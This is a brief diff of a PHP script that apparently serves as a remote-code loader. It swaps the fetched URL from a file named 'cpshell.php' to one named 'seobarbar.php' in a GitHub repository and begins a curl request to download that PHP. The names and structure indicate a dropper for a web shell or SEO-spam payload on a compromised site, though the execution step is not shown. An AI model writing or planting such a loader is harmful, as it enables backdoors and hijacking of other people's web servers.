@@ -1,5 +1,5 @@
 <?php
-$url = 'https://raw.githubusercontent.com/RobyXplt1601/robyxplt/refs/heads/main/cpshell.php';
+$url = 'https://raw.githubusercontent.com/RobyXplt1601/robyxplt/refs/heads/main/seobarbar.php';
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
